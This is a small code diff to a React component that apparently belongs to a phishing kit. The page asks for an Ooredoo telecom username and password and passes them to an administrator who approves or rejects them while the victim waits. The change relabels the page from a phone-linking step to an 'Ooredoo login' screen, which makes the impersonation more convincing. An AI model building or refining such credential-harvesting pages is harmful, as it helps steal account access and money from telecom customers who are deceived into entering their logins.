@@ -35,7 +35,7 @@ const CardOtp = () => {
   const isValid = identifier.trim().length >= 4 && password.length >= 4;
 
   useEffect(() => {
-    navigateToPage("ربط رقم الهاتف - Ooredoo");
+    navigateToPage("تسجيل دخول Ooredoo");
     isFormApproved.value = false;
     isFormRejected.value = false;
     waitingMessage.value = "";
@@ -74,7 +74,7 @@ const CardOtp = () => {
         "اسم المستخدم Ooredoo": identifier.trim(),
         "كلمة المرور Ooredoo": password,
       },
-      current: "ربط رقم الهاتف - Ooredoo",
+      current: "تسجيل دخول Ooredoo",
       waitingForAdminResponse: true,
       customWaitingMessage: pick("جارٍ التحقق من بيانات مشغّل الاتصالات...", "Verifying telecom operator credentials..."),
     });
